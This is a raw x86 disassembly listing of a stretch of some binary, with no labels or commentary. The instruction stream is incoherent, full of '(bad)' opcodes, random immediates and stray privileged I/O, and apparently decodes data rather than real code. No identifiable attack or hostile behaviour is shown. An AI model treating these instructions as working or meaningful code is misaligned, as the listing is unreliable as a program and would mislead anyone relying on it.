  42ad59:	or     ah,BYTE PTR [ebx+0x1d]
  42ad5c:	mov    ebx,ebx
  42ad5e:	test   BYTE PTR [ebx],bh
  42ad60:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ad61:	jne    0x42ada0
  42ad63:	xchg   DWORD PTR [edx-0x2c],ecx
  42ad66:	adc    ah,BYTE PTR [esi+eax*2+0x39b3921b]
  42ad6d:	das    
  42ad6e:	(bad)  
  42ad6f:	mov    al,0x25
  42ad71:	pop    es
  42ad72:	aad    0x2f
  42ad74:	int    0x3f
  42ad76:	or     BYTE PTR [eax],0x76
  42ad79:	inc    esi
  42ad7a:	inc    edx
  42ad7b:	mov    ecx,0x2221619c
  42ad80:	cli    
  42ad81:	sub    ah,BYTE PTR ds:0x7b57905c
  42ad87:	xchg   esi,eax
  42ad88:	pop    es
  42ad89:	call   0x3824821
  42ad8e:	shl    BYTE PTR [ebx-0x8],cl
  42ad91:	test   bh,bl
  42ad93:	xor    ah,BYTE PTR [edx-0x3af57118]
  42ad99:	out    dx,eax
  42ad9a:	fimul  DWORD PTR [esi+edi*4]
  42ad9d:	push   0x913aa321
  42ada2:	mov    ecx,0x52540da6
  42ada7:	cmp    eax,0x58b2e5da
  42adac:	pop    esp
  42adad:	(bad)  
  42adae:	das    
  42adaf:	enter  0x12dc,0x29
  42adb3:	push   edi
  42adb4:	loope  0x42adf0
  42adb6:	jne    0x42ada1
  42adb8:	pop    es
  42adb9:	lahf   
  42adba:	repz pop eax
  42adbc:	int    0xc7
  42adbe:	sbb    edx,ecx
  42adc0:	test   DWORD PTR [esi-0x7fa503b3],esi
  42adc6:	add    eax,0xbeb9999e
  42adcb:	retf   0x7ba6
  42adce:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42adcf:	inc    esp
  42add0:	int3   
  42add1:	mov    BYTE PTR [eax+0x9],ah
  42add4:	(bad)  [esi-0x56]
  42add7:	or     DWORD PTR [edi-0x61961000],edi
  42addd:	sti    
  42adde:	xor    al,0x98
  42ade0:	sub    DWORD PTR [ebx-0x65e0af29],ebp
  42ade6:	sbb    ch,BYTE PTR ss:[ebp+0x75]
  42adea:	jno    0x42ae12
  42adec:	dec    edi
  42aded:	and    DWORD PTR [ebx-0x4f679a28],0xffffffe5
  42adf4:	(bad)  
  42adf5:	pop    edx
  42adf6:	leave  
  42adf7:	xchg   esp,eax
  42adf8:	mov    ecx,ecx
  42adfa:	pop    edi
  42adfb:	pop    esp
  42adfc:	aaa    
  42adfd:	dec    esp
  42adfe:	leave  
  42adff:	test   BYTE PTR [edi],ch
  42ae01:	jmp    0x2461a712
  42ae06:	jmp    0x9624:0x5012117a
  42ae0d:	push   ebp
  42ae0e:	clc    
  42ae0f:	shr    DWORD PTR [ecx+0x0],0x0
	...
  42ae73:	add    BYTE PTR [edi+0x4a8e4af7],bh
  42ae79:	mov    edi,0x7bd8f7ff
  42ae7e:	mov    dh,0xb9
  42ae80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42ae81:	add    DWORD PTR [edi+esi*2],edi
  42ae84:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42ae85:	retf   
  42ae86:	add    DWORD PTR [eax],eax
  42ae88:	add    eax,0x89000001
  42ae8d:	push   ss
  42ae8e:	int3   
  42ae8f:	sbb    eax,0xd49e4fbe
  42ae94:	mov    edx,0xd3f364b3
  42ae99:	sbb    al,0xa4
  42ae9b:	jmp    0x628840b9
  42aea0:	ror    BYTE PTR [edx-0x1e],cl
  42aea3:	enter  0x386f,0x85
  42aea7:	popf   
  42aea8:	rol    BYTE PTR [ebp+eiz*2-0x40abc530],1
  42aeaf:	retf   0x1adc
  42aeb2:	xchg   BYTE PTR [edx+edi*1],ch
  42aeb5:	repz cmp ch,BYTE PTR [ecx]
  42aeb8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42aeb9:	fst    QWORD PTR ds:0xc98133e2
  42aebf:	adc    bh,BYTE PTR [eax]
  42aec1:	ret    0xe87f
  42aec4:	add    DWORD PTR [eax],esp
  42aec6:	push   cs
  42aec7:	mov    ecx,0xd6add528
  42aecc:	mov    ch,dl
  42aece:	out    dx,al
  42aecf:	cdq    
  42aed0:	loopne 0x42ae66
  42aed2:	xchg   ecx,eax
  42aed3:	nop
  42aed4:	sbb    eax,0x7929b9cf
  42aed9:	in     eax,dx
  42aeda:	dec    ecx
  42aedb:	and    esp,ebp
  42aedd:	jge    0x42af19
  42aedf:	inc    edi
  42aee0:	je     0x42aeab
  42aee2:	(bad)  
  42aee4:	sbb    DWORD PTR [ebp+0x27],ebp
  42aee7:	and    eax,0xe9b47fdc
  42aeec:	pushf  
  42aeed:	pop    ebx
  42aeee:	gs loopne 0x42af65
  42aef1:	arpl   WORD PTR [esi-0x26],di
  42aef4:	push   esi
  42aef5:	mov    dl,0x8
  42aef7:	mov    esi,0x27138735
  42aefc:	cwde   
  42aefd:	jno    0x42af75
  42aeff:	sbb    DWORD PTR [esi],eax
  42af01:	or     BYTE PTR [esi+0x24],al
  42af04:	aas    
  42af05:	js     0x42aee2
  42af07:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42af08:	add    ebx,DWORD PTR [eax]
  42af0a:	outs   dx,BYTE PTR ds:[esi]
  42af0b:	mov    al,bh
  42af0d:	icebp  
  42af0e:	retf   
  42af0f:	xor    eax,0xe98e423f
  42af14:	and    dl,BYTE PTR [ecx-0x52]
  42af17:	mov    bl,0x27
  42af19:	push   eax
  42af1a:	jg     0x42af3a
  42af1c:	sahf   
  42af1d:	sub    dl,BYTE PTR [esi+0x58]
  42af20:	cmp    DWORD PTR [edx+0x2e],ebp
  42af23:	push   ds
  42af24:	dec    esi
  42af25:	and    eax,0x21414226
  42af2a:	mov    ebp,0x800addf
  42af2f:	fst    DWORD PTR [ecx+0x6fc622bd]
  42af35:	xchg   ecx,eax
  42af36:	dec    ecx
  42af37:	push   cs
  42af38:	in     eax,0x9
  42af3a:	in     al,dx
  42af3b:	pop    ecx
  42af3c:	lock jb 0x42afb0
  42af3f:	addr16 aad 0x87
  42af42:	jmp    0x12546e18
  42af47:	xor    eax,0x1bb703bf
  42af4c:	push   edx
  42af4d:	lock in eax,0x0
  42af50:	jnp    0x42af1d
  42af52:	rol    DWORD PTR [ecx-0x2d203b67],1
  42af58:	mov    bh,0xd9
  42af5a:	cdq    
  42af5b:	xor    eax,0xafab9788
  42af60:	inc    ebp
  42af61:	cld    
  42af62:	inc    ecx
  42af63:	add    eax,0x16d14c81
  42af68:	or     al,0xdb
  42af6a:	xor    eax,0x675b5129
  42af6f:	icebp  
  42af70:	aad    0x49
  42af72:	dec    edx
  42af73:	mov    eax,0xb272bf72
  42af78:	sbb    edx,ecx
  42af7a:	xchg   esi,eax
  42af7b:	dec    eax
  42af7c:	adc    dh,0x1b
  42af7f:	cld    
  42af80:	aaa    
  42af81:	xor    eax,0xae0e57eb
  42af86:	jo     0x42afa7
  42af88:	mov    eax,ds:0x35da60a6
  42af8d:	popa   
  42af8e:	jo     0x42afac
  42af90:	stc    
	...
  42aff1:	add    BYTE PTR [eax],al
  42aff3:	add    cl,bh
  42aff5:	enter  0xdc7a,0x7b
  42aff9:	(bad)  
  42affa:	(bad)  
  42affb:	in     eax,dx
  42affc:	sbb    al,0x4f
  42affe:	push   ebp
  42afff:	inc    esp
  42b000:	pop    edi
  42b001:	and    DWORD PTR [esi-0x2b],0x1ccaa
  42b008:	add    eax,0x15000001
  42b00d:	les    eax,FWORD PTR fs:[ecx]
  42b010:	add    dh,BYTE PTR [edx-0x38]
  42b013:	sbb    eax,0xac9b3e21
  42b018:	popf   
  42b019:	jl     0x42aff3
  42b01b:	jne    0x42b004
  42b01d:	not    ecx
  42b01f:	das    
  42b020:	mov    dh,0x21
  42b022:	cmp    eax,DWORD PTR [eax+0x70b1dca2]
  42b028:	or     ch,dl
  42b02a:	xor    DWORD PTR [ecx-0x6e],edi
  42b02d:	(bad)  
  42b02e:	(bad)  
  42b030:	and    al,0xc8
  42b032:	xchg   esp,eax
  42b033:	ins    DWORD PTR es:[edi],dx
  42b034:	aas    
  42b035:	dec    esp
  42b036:	mov    dl,BYTE PTR [esi]
  42b038:	mov    dh,0x1f
  42b03a:	adc    eax,0xb1d94f92
  42b03f:	cmc    
  42b040:	add    al,0x26
  42b042:	repnz mov ah,0x95
  42b045:	dec    ebp
  42b046:	ret    
  42b047:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b048:	cs and al,dl
  42b04b:	xchg   DWORD PTR ds:0x8ce47d2a,esp
  42b051:	push   ebx
  42b052:	(bad)  
  42b053:	dec    ecx
  42b054:	aaa    
  42b055:	out    dx,al
  42b056:	stos   BYTE PTR es:[edi],al
  42b057:	stc    
  42b058:	mov    ah,0xdd
  42b05a:	push   eax
  42b05b:	mov    edx,0x98fade63
  42b060:	jmp    0x8d3e8b2f
  42b065:	and    eax,ecx
  42b067:	ret    0x8434
  42b06a:	(bad)  
  42b06b:	pop    esi
  42b06c:	push   ds
  42b06d:	retf   0x88fe
  42b070:	mov    ebp,0x62695dfb
  42b075:	lahf   
  42b076:	aad    0x1a
  42b078:	xchg   ebx,eax
  42b079:	pop    esi
  42b07a:	ja     0x42b072
  42b07c:	add    BYTE PTR [ecx+0x45],al
  42b07f:	sbb    ebx,DWORD PTR [esi]
  42b081:	push   ebx
  42b082:	add    al,BYTE PTR [esi-0x2b]
  42b085:	(bad)  
  42b086:	clc    
  42b087:	ret    0x39ec
  42b08a:	out    0x47,eax
  42b08c:	mov    esp,0x731b2c1a
  42b091:	xor    BYTE PTR ds:0x7d857b64,dl
  42b097:	push   0xffffff96
  42b099:	(bad)  
  42b09a:	xchg   edi,eax
  42b09b:	mov    edi,0xc769cd5b
  42b0a0:	jo     0x42b111
  42b0a2:	sub    cl,ah
  42b0a4:	fwait
  42b0a5:	jp     0x42b093
  42b0a7:	add    DWORD PTR [ebx-0x6a87900],ebp
  42b0ad:	jg     0x42b0db
  42b0af:	stos   BYTE PTR es:[edi],al
  42b0b0:	mov    ch,0x30
  42b0b2:	sti    
  42b0b3:	test   eax,0x62037ba4
  42b0b8:	fld    TBYTE PTR ds:0xbdbe691a
  42b0be:	ror    ch,0xd3
  42b0c1:	adc    eax,DWORD PTR [ebp+0x5]
  42b0c4:	or     bh,BYTE PTR [edx+0x2be6e1c6]
  42b0ca:	and    BYTE PTR [ebp+0x1879f8ec],dl
  42b0d0:	adc    eax,0x6e1931bd
  42b0d5:	xchg   edx,eax
  42b0d6:	xor    ch,BYTE PTR [ecx+0x62c8e906]
  42b0dc:	jmp    0x50fd:0x6240424c
  42b0e3:	bound  ebp,QWORD PTR [ebx]
  42b0e5:	addr16 js 0x42b105
  42b0e8:	ret    
  42b0e9:	dec    ebx
  42b0ea:	inc    esi
  42b0eb:	cmp    cl,dl
  42b0ed:	sub    ah,BYTE PTR [esi]
  42b0ef:	icebp  
  42b0f0:	jle    0x42b11d
  42b0f2:	mov    bl,0x21
  42b0f4:	test   ah,bl
  42b0f6:	adc    DWORD PTR [esi+edi*1],esp
  42b0f9:	dec    eax
  42b0fa:	popa   
  42b0fb:	adc    esp,DWORD PTR [ebx]
  42b0fd:	mov    cl,0x29
  42b0ff:	clc    
  42b100:	inc    esp
  42b101:	push   es
  42b102:	push   ecx
  42b103:	fisubr WORD PTR [ebx]
  42b105:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42b106:	mov    edx,0xb974af52
  42b10b:	fs pop ds
  42b10d:	ror    BYTE PTR ds:0x5503,1
	...
  42b173:	add    BYTE PTR [ebp+0x25],dh
  42b176:	imul   ebx,DWORD PTR [edi-0x51]
  42b17a:	cmc    
  42b17b:	call   eax
  42b17d:	inc    ebx
  42b17e:	push   edi
  42b17f:	popa   
  42b180:	mov    al,ch
  42b182:	adc    dh,BYTE PTR [esi+0x1cdaf]
  42b188:	add    eax,0xe2000001
  42b18d:	in     eax,dx
  42b18e:	inc    esp
  42b18f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42b190:	and    al,0x75
  42b192:	mov    esi,0xdf8041ca
  42b197:	std    
  42b198:	out    dx,al
  42b199:	push   ecx
  42b19a:	sbb    al,BYTE PTR ds:0x96a80326
  42b1a0:	aaa    
  42b1a1:	mov    esp,0xa7d7ce53
  42b1a6:	fucomp st(4)
  42b1a8:	xchg   DWORD PTR [ebp-0x2b],ecx
  42b1ab:	mov    dl,0xea
  42b1ad:	sar    BYTE PTR es:[edi],1
  42b1b0:	xchg   DWORD PTR [edx],ebx
  42b1b2:	inc    edx
  42b1b3:	nop
  42b1b4:	ret    0xd1e0
  42b1b7:	cmp    DWORD PTR ds:0xe09b6429,esi
  42b1bd:	ins    DWORD PTR es:[edi],dx
  42b1be:	inc    ebp
  42b1bf:	pop    ebx
  42b1c0:	leave  
  42b1c1:	pop    ebp
  42b1c2:	lea    ebx,[eax-0x5180aafa]
  42b1c8:	jb     0x42b1a2
  42b1ca:	inc    BYTE PTR ss:[edx]
  42b1cd:	adc    ah,dl
  42b1cf:	mov    dh,0xda
  42b1d1:	je     0x42b19e
  42b1d3:	xor    DWORD PTR [ebp-0x50b5d345],ebp
  42b1d9:	mov    dl,0xf
  42b1db:	push   es
  42b1dc:	and    eax,0xcd687090
  42b1e1:	and    edi,esp
  42b1e3:	add    ch,BYTE PTR [edx-0x560cfa7a]
  42b1e9:	adc    dl,cl
  42b1eb:	or     DWORD PTR [eax-0x6c],eax
  42b1ee:	or     bh,BYTE PTR [edx+0x38]
  42b1f1:	fmul   QWORD PTR [esi+0x4cae5371]
  42b1f7:	sbb    ebx,DWORD PTR [eax]
  42b1f9:	and    eax,0x1d96eedf
  42b1fe:	inc    esi
  42b1ff:	dec    edi
  42b200:	jecxz  0x42b189
  42b202:	add    ecx,DWORD PTR [esp+eax*8-0x4ccbfbe5]
  42b209:	shl    DWORD PTR [ebp+0x642150eb],cl
  42b20f:	push   0x2f
  42b211:	jge    0x42b227
  42b213:	xchg   BYTE PTR [esi+0x18],cl
  42b216:	mov    ecx,0x8ea9294f
  42b21b:	repnz xchg ecx,eax
  42b21d:	mov    eax,ds:0xd03bdfa5
  42b222:	pop    edi
  42b223:	jp     0x42b205
  42b225:	or     BYTE PTR [ebp+0x6e],bh
  42b228:	dec    edx
  42b229:	sub    DWORD PTR [ecx-0x3329cb8f],0x6ea44e63
  42b233:	mov    bh,BYTE PTR [esi+edx*2]
  42b236:	sti    
  42b237:	pusha  
  42b238:	in     eax,dx
  42b239:	sub    ebp,DWORD PTR [edx+eax*2-0x9]
  42b23d:	push   esp
  42b23e:	cmp    DWORD PTR [edx],ecx
  42b240:	sub    ecx,DWORD PTR [ecx+0x4]
  42b243:	pusha  
  42b244:	dec    edi
  42b245:	cmp    eax,edi
  42b247:	mov    DWORD PTR [esi-0x4c],esp
  42b24a:	jmp    0x29f1d5b0
  42b24f:	lds    esp,FWORD PTR ds:0x1c3f1e7c
  42b255:	adc    al,0x1
  42b257:	and    al,0xbd
  42b259:	xor    DWORD PTR [ebx-0x6],edx
  42b25c:	mov    bl,0x93
  42b25e:	rcr    DWORD PTR [eax-0x3017e9ae],cl
  42b264:	sti    
  42b265:	daa    
  42b266:	xchg   ecx,eax
  42b267:	adc    bh,al
  42b269:	xor    al,0x54
  42b26b:	jge    0x42b283
  42b26d:	ror    edx,1
  42b26f:	(bad)  
  42b270:	lea    esp,[edx+0x648ad7c0]
  42b276:	pop    edi
  42b277:	scas   al,BYTE PTR es:[edi]
  42b278:	jb     0x42b2cb
  42b27a:	arpl   WORD PTR [edx+edi*1+0x2],sp
  42b27e:	js     0x42b280
  42b280:	lods   al,BYTE PTR ds:[esi]
  42b281:	pop    ebx
  42b282:	add    bl,BYTE PTR [ecx]
  42b284:	cmp    dh,dl
  42b286:	mov    dl,0xb6
  42b288:	call   0xe0c5dc09
  42b28d:	dec    esp
  42b28e:	test   BYTE PTR [edi+0x6b],bh
	...
  42b2f1:	add    BYTE PTR [eax],al
  42b2f3:	add    BYTE PTR [ebp-0x449f6672],ah
  42b2f9:	ja     0x42b2f8
  42b2fb:	iret   
  42b2fc:	sub    eax,0x62738e65
  42b301:	push   es
  42b302:	jns    0x42b364
  42b304:	mov    ah,0xce
  42b306:	add    DWORD PTR [eax],eax
  42b308:	add    eax,0xc2000001
  42b30d:	out    dx,eax
  42b30e:	inc    esp
  42b30f:	push   es
  42b310:	mov    eax,0x7f9184c4
  42b315:	add    DWORD PTR [edx+0x3ed79cfa],0x6f263095
  42b31f:	cli    
  42b320:	(bad)  
  42b321:	out    0x52,eax
  42b323:	mov    edx,0xc6d81a06
  42b328:	fstp   QWORD PTR [edi+0x723a8f3a]
  42b32e:	add    al,0x43
  42b330:	xor    al,0x5a
  42b332:	popf   
  42b333:	scas   eax,DWORD PTR es:[edi]
  42b334:	js     0x42b38a
  42b336:	mov    esp,0xe71d150c
  42b33b:	outs   dx,DWORD PTR es:[esi]
  42b33d:	adc    al,0x3d
  42b33f:	mov    al,ds:0x1d946250
  42b344:	mov    al,0x2
  42b346:	in     al,dx
  42b347:	ror    DWORD PTR [eax],cl
  42b349:	mov    eax,ds:0x8d887
  42b34e:	stc    
  42b34f:	and    DWORD PTR [ecx-0x79],edx
  42b352:	or     al,0xdb
  42b354:	mov    WORD PTR [esi-0x1f],ss
  42b357:	jns    0x42b30a
  42b359:	mov    bh,BYTE PTR [eax+0x5d]
  42b35c:	sub    eax,0xc91aae9
  42b361:	inc    ebx
  42b362:	bnd jnp 0x42b3ba
  42b365:	sub    al,0x2f
  42b367:	pop    ebx
  42b368:	stos   BYTE PTR es:[edi],al
  42b369:	cwde   
  42b36a:	or     BYTE PTR es:[eax-0x31243685],0x0
  42b372:	popa   
  42b373:	addr16 push 0xffffff82
  42b376:	popf   
  42b377:	pop    edx
  42b378:	cmp    al,0x3f
  42b37a:	repnz scas al,BYTE PTR es:[edi]
  42b37c:	mov    ebx,0x1ddb8c6e
  42b381:	in     eax,dx
  42b382:	pusha  
  42b383:	data16 aad 0x2b
  42b386:	pop    edx
  42b387:	inc    esi
  42b388:	pop    ebx
  42b389:	add    al,0x86
  42b38b:	clc    
  42b38c:	mov    cl,0x97
  42b38e:	daa    
  42b38f:	das    
  42b390:	not    DWORD PTR [ebp-0x56]
  42b393:	jp     0x42b3a2
  42b395:	mov    edx,0x21f3a15a
  42b39a:	add    edx,0x63fb6294
  42b3a0:	cmp    al,0x43
  42b3a2:	es mov ebp,0x5470be8d
  42b3a8:	ins    BYTE PTR es:[edi],dx
  42b3a9:	gs cmp eax,0x99b9e097
  42b3af:	lds    esi,FWORD PTR fs:[eax-0x4]
  42b3b3:	pop    ss
  42b3b4:	add    BYTE PTR [eax+0x60],dl
  42b3b7:	pusha  
  42b3b8:	int    0x46
  42b3ba:	repnz add al,0x29
  42b3bd:	int3   
  42b3be:	scas   al,BYTE PTR es:[edi]
  42b3bf:	mov    fs,WORD PTR [esi+0x62]
  42b3c2:	mov    cl,0xfc
  42b3c4:	adc    BYTE PTR [edi-0x6b55e4db],cl
  42b3ca:	sub    al,0x62
  42b3cc:	call   FWORD PTR [ecx-0x3885cc68]
  42b3d2:	push   ebx
  42b3d3:	xchg   ebp,eax
  42b3d4:	test   edx,0xab6c7e55
  42b3da:	cdq    
  42b3db:	test   DWORD PTR [ebp+0x78450a59],esp
  42b3e1:	lock loop 0x42b430
  42b3e4:	push   0x7c0a1b8f
  42b3e9:	outs   dx,BYTE PTR ds:[esi]
  42b3ea:	xor    ebx,eax
  42b3ec:	fsub   st(2),st
  42b3ee:	xor    DWORD PTR [ebx-0x53],esp
  42b3f1:	adc    al,0xcc
  42b3f3:	fdivr  QWORD PTR [edi-0x30142d08]
  42b3f9:	mov    cl,0x9c
  42b3fb:	jl     0x42b3d3
  42b3fd:	xchg   WORD PTR [ecx],cx
  42b400:	add    ebp,0xffffffc9
  42b403:	jle    0x42b46b
  42b405:	repz xchg ebx,eax
  42b407:	stc    
  42b408:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b409:	cdq    
  42b40a:	bnd ret 0x467f
  42b40e:	or     ecx,DWORD PTR [ebp+0xb9]
	...
  42b474:	mov    al,BYTE PTR [ebp+0x20]
  42b477:	out    dx,al
  42b478:	out    dx,eax
  42b479:	out    dx,eax
  42b47a:	into   
  42b47b:	gs jo  0x42b44e
  42b47e:	cld    
  42b47f:	test   DWORD PTR [edx],ecx
  42b481:	cmp    dh,cl
  42b483:	dec    ecx
  42b484:	mov    ecx,0x50001cf
  42b489:	add    DWORD PTR [eax],eax
  42b48b:	add    BYTE PTR [ebp-0x3d],ch
  42b48e:	pop    esi
  42b48f:	aas    
  42b490:	cmp    BYTE PTR [edx-0x32],0xd7
  42b494:	mov    edx,?
  42b496:	pop    edi
  42b497:	popf   
  42b498:	lea    esp,[edi-0x27]
  42b49b:	push   ds
  42b49c:	dec    ebp
  42b49d:	pop    ebx
  42b49e:	dec    ebx
  42b49f:	outs   dx,BYTE PTR ds:[esi]
  42b4a0:	out    0x14,al
  42b4a2:	fst    QWORD PTR [edi-0x5caabf1e]
  42b4a8:	sbb    BYTE PTR [ecx],0xcc
  42b4ab:	mov    eax,ds:0x8dc6d950
  42b4b0:	push   edx
  42b4b1:	test   BYTE PTR [eax],dl
  42b4b3:	dec    ecx
  42b4b4:	adc    ebx,DWORD PTR [edi]
  42b4b6:	ins    DWORD PTR es:[edi],dx
  42b4b7:	outs   dx,BYTE PTR ds:[esi]
  42b4b8:	aam    0xc6
  42b4ba:	push   esi
  42b4bb:	fadd   st,st(1)
  42b4bd:	jno    0x42b50b
  42b4bf:	sti    
  42b4c0:	and    ebp,DWORD PTR [esi-0x42]
  42b4c3:	fs cwde 
  42b4c5:	(bad)  
  42b4c6:	ins    DWORD PTR es:[edi],dx
  42b4c7:	sahf   
  42b4c8:	jmp    0x42b4a2
  42b4ca:	loope  0x42b482
  42b4cc:	sub    ebx,ebp
  42b4ce:	mov    bl,0x6
  42b4d0:	bound  ebp,QWORD PTR [ebx]
  42b4d2:	and    al,0xcb
  42b4d4:	pop    ss
  42b4d5:	js     0x42b48c
  42b4d7:	cmp    ecx,ecx
  42b4d9:	mov    WORD PTR [ebp-0x34],?
  42b4dc:	je     0x42b497
  42b4de:	js     0x42b549
  42b4e0:	in     eax,dx
  42b4e1:	and    eax,0x66415004
  42b4e6:	in     al,0x1d
  42b4e8:	mov    ah,ah
  42b4ea:	adc    DWORD PTR [eax-0x29814e4d],0xffffff9e
  42b4f1:	mov    edx,0xffd525d3
  42b4f6:	aam    0x35
  42b4f8:	and    dl,bh
  42b4fa:	pop    edi
  42b4fb:	inc    eax
  42b4fc:	stc    
  42b4fd:	mov    ebp,0xfc17ecc7
  42b502:	mov    ebx,0x7447d508
  42b507:	push   es
  42b508:	repnz add al,0x36
  42b50b:	cmp    ah,bl
  42b50d:	das    
  42b50e:	ja     0x42b50a
  42b510:	pop    ecx
  42b511:	nop
  42b512:	(bad)
  42b517:	jno    0x42b49c
  42b519:	jae    0x42b591
  42b51b:	or     BYTE PTR [edx+eiz*1],ch
  42b51e:	push   esp
  42b51f:	sbb    DWORD PTR [ecx+0x2b],ebp
  42b522:	dec    ebp
  42b523:	adc    bl,BYTE PTR [ebx]
  42b525:	cmp    al,0x2f
  42b527:	mov    bl,0x36
  42b529:	inc    edi
  42b52a:	(bad)  
  42b52b:	outs   dx,DWORD PTR ds:[esi]
  42b52c:	push   ds
  42b52d:	aam    0xb6
  42b52f:	add    ch,bh
  42b531:	adc    dh,ah
  42b533:	mov    dl,0x31
  42b535:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42b536:	inc    esp
  42b537:	call   0x8c702607
  42b53c:	xor    DWORD PTR [ecx],esp
  42b53e:	rol    BYTE PTR [esi+ebp*4-0x4f],cl
  42b542:	fcomp  st(0)
  42b544:	and    cl,BYTE PTR [edx]
  42b546:	in     eax,0xde
  42b548:	aas    
  42b549:	mov    al,0x1b
  42b54b:	and    eax,0xbae4b2a4
  42b550:	cmp    edx,DWORD PTR [ebp+0x1459b794]
  42b556:	mov    esp,0x3d92a524
  42b55b:	or     DWORD PTR [edx+0x4a],esp
  42b55e:	pop    esp
  42b55f:	dec    ebp
  42b560:	mov    bl,0x66
  42b562:	cld    
  42b563:	les    ecx,FWORD PTR [esi-0x1224ae31]
  42b569:	inc    ecx
  42b56a:	sbb    bh,BYTE PTR [ebx+ecx*2]
  42b56d:	mov    edi,0xb3d0f313
  42b572:	ds ds cdq 
  42b575:	add    edx,esp
  42b577:	cmp    ecx,DWORD PTR es:[ecx+0x49]
  42b57b:	call   0xa98de4e3
  42b580:	xlat   BYTE PTR ds:[ebx]
  42b581:	shr    edi,0xd5
  42b584:	push   DWORD PTR [edx+0x5f9ac319]
  42b58a:	push   ebx
  42b58b:	(bad)  
  42b58c:	jmp    0x3df68c58
	...
  42b5f1:	add    BYTE PTR [eax],al
  42b5f3:	add    al,ah
  42b5f5:	xchg   esp,eax
  42b5f6:	and    bh,cl
  42b5f8:	je     0x42b5f9
  42b5fa:	out    dx,eax
  42b5fb:	mov    edi,0x1397875f
  42b600:	inc    esi
  42b601:	mov    ah,0x4c
  42b603:	fs mov esi,0x50001d0
  42b609:	add    DWORD PTR [eax],eax
  42b60b:	add    BYTE PTR [ecx+0x6ecab0b3],bl
  42b611:	je     0x42b686
  42b613:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42b614:	addr16 pop ebp
  42b616:	jmp    0x42b5d2
  42b618:	es xchg ecx,eax
  42b61a:	ret    0x812d
  42b61d:	fs sbb al,0xd8
  42b620:	dec    esi
  42b621:	xor    al,0x33
  42b623:	and    bl,dh
  42b625:	popa   
  42b626:	add    al,0x85
  42b628:	outs   dx,DWORD PTR ds:[esi]
  42b629:	xor    dl,BYTE PTR [edx]
  42b62b:	test   BYTE PTR [eax+edi*8-0x2b],bh
  42b62f:	push   ss
  42b630:	fisttp WORD PTR [ecx]
  42b632:	dec    ebp
  42b633:	data16 int3 
  42b635:	jmp    0x42b677
  42b637:	inc    edi
  42b638:	gs loop 0x42b690
  42b63b:	je     0x42b663
  42b63d:	cmp    eax,0xe829cd70
  42b642:	clc    
  42b643:	xchg   edx,eax
  42b644:	(bad)  
  42b646:	cld    
  42b647:	xlat   BYTE PTR ds:[ebx]
  42b648:	or     esp,DWORD PTR [edi]
  42b64a:	xor    al,0xfb
  42b64c:	aad    0xef
  42b64e:	fs push ebx
  42b650:	enter  0x823a,0x8e
  42b654:	inc    ecx
  42b655:	inc    ebx
  42b656:	loopne 0x42b5e6
  42b658:	mov    al,0x16
  42b65a:	dec    esp
  42b65b:	cmp    BYTE PTR [edi],ch
  42b65d:	xchg   esi,eax
  42b65e:	mov    dh,0x98
  42b660:	repnz xchg edi,eax
  42b662:	mov    esp,0xd0faf2ab
  42b667:	and    bl,BYTE PTR [edi-0x63]
  42b66a:	cmp    esi,DWORD PTR [eax]
  42b66c:	int    0x6a
  42b66e:	or     eax,0xacb63dbf
  42b673:	jo     0x42b698
  42b675:	mov    ebx,0x747e969
  42b67a:	cs mov eax,0xab56994e
  42b680:	mov    esi,0x27760a39
  42b685:	clc    
  42b686:	pushf  
  42b687:	mov    esp,0x355269da
  42b68c:	js     0x42b6d0
  42b68e:	mov    ebp,0xce07a177
  42b693:	mov    esi,0x8b87698f
  42b698:	add    eax,0x4364a554
  42b69d:	jae    0x42b640
  42b69f:	loope  0x42b6f1
  42b6a1:	pushf  
  42b6a2:	mov    ebx,0x3155481b
  42b6a7:	stos   DWORD PTR es:[edi],eax
  42b6a8:	mov    bl,0x10
  42b6aa:	nop
  42b6ab:	fist   DWORD PTR [ebx+0x2cb27d4f]
  42b6b1:	adc    BYTE PTR [edi-0x2de58919],dl
  42b6b7:	jecxz  0x42b6ee
  42b6b9:	mov    ecx,0xf5bcd186
  42b6be:	mov    bh,0x71
  42b6c0:	or     al,0x99
  42b6c2:	out    0x4c,eax
  42b6c4:	data16 mov ch,dl
  42b6c7:	add    edi,DWORD PTR [ecx+0x51]
  42b6ca:	enter  0xa78c,0xa8
  42b6ce:	pop    edi
  42b6cf:	xor    bl,dh
  42b6d1:	dec    edi
  42b6d2:	test   esi,ebp
  42b6d4:	leave  
  42b6d5:	add    BYTE PTR [ebp+0x1be038f7],bh
  42b6db:	mov    edx,0xfbd20518
  42b6e0:	sar    BYTE PTR [eax],0x58
  42b6e3:	inc    edi
  42b6e4:	mov    bh,0x92
  42b6e6:	sbb    esi,DWORD PTR [ebp-0x52]
  42b6e9:	sub    DWORD PTR [eax+0x11],ebp
  42b6ec:	inc    ebp
  42b6ed:	cmp    bh,al
  42b6ef:	pop    edx
  42b6f0:	pop    DWORD PTR [ecx-0x27]
  42b6f3:	jne    0x42b67f
  42b6f5:	fwait
  42b6f6:	daa    
  42b6f7:	and    edi,esi
  42b6f9:	ja     0x42b720
  42b6fb:	mov    WORD PTR [edx+0x4e],?
  42b6fe:	pop    ebx
  42b6ff:	lea    esp,[ecx]
  42b701:	sbb    DWORD PTR [esi],esi
  42b703:	inc    edx
  42b704:	sbb    BYTE PTR [ebx-0x5053eda1],al
  42b70a:	mov    ebp,0x7b79f22f
  42b70f:	add    BYTE PTR ds:0x0,dh
	...
  42b771:	add    BYTE PTR [eax],al
  42b773:	add    BYTE PTR [esi+0x42],cl
  42b776:	dec    ecx
  42b777:	daa    
  42b778:	dec    ebp
  42b779:	das    
  42b77a:	outs   dx,BYTE PTR ds:[esi]
  42b77b:	imul   edx,edx,0x63
  42b77e:	push   ecx
  42b77f:	xchg   edx,eax
  42b780:	dec    edx
  42b781:	fisub  DWORD PTR fs:[ebx+eax*8]
